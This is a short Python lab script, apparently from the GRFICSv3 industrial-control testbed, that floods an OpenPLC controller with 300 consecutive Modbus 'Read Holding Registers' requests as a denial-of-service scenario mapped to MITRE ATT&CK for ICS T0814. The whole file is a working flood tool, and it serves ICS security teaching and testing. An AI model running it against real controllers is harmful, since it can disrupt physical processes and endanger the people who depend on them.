"""
Scénario 3 — Flood applicatif Modbus (MITRE ATT&CK for ICS : T0814 - Denial of Service)

Envoie 300 requêtes "Read Holding Registers" (FC3) consécutives, sans délai,
vers le PLC OpenPLC du laboratoire GRFICSv3.

!! À utiliser UNIQUEMENT dans le laboratoire GRFICSv3 isolé. !!
"""
from pymodbus.client import ModbusTcpClient

PLC_IP = "192.168.95.2"
PLC_PORT = 502
REQUESTS = 300

client = ModbusTcpClient(
    PLC_IP,
    port=PLC_PORT,
    timeout=2
)

if not client.connect():
    print("[-] Cannot connect to PLC")
    exit(1)

print(f"[+] Connected to PLC {PLC_IP}:{PLC_PORT}")
print(f"[*] Starting Modbus DoS test: {REQUESTS} requests")

success = 0
errors = 0

for i in range(REQUESTS):
    result = client.read_holding_registers(
        address=0,
        count=1,
        device_id=1
    )

    if result.isError():
        errors += 1
    else:
        success += 1

    print(f"[{i+1}/{REQUESTS}]")

client.close()

print("[+] Test completed")
print(f"[+] Successful requests: {success}")
print(f"[-] Errors: {errors}")
